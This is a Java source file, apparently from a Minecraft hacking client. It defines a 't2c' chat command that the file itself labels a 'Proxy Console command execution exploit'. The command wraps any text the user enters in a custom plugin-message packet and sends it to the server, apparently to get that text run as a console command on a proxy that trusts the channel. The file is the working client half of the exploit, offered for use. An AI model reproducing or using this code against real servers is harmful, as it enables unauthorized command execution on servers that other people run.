package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.network.packet.CustomPayload;

import net.paradise_client.Helper;
import net.paradise_client.command.Command;
import net.paradise_client.packet.T2CPayloadPacket;

public class T2CCommand extends Command {

    public T2CCommand() {
        super("t2c", "Proxy Console command execution exploit");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(context -> {
            Helper.printChatMessage("Incomplete command!");
            return 1;
        }).then(argument("command", StringArgumentType.greedyString())
            .executes(context -> {
                String cmd = context.getArgument("command", String.class);
                CustomPayload payload = new T2CPayloadPacket(cmd); // Your custom payload
                CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(payload);
                Helper.sendPacket(packet);
                Helper.printChatMessage("Payload sent!");
                return 1;
            }));
    }
}
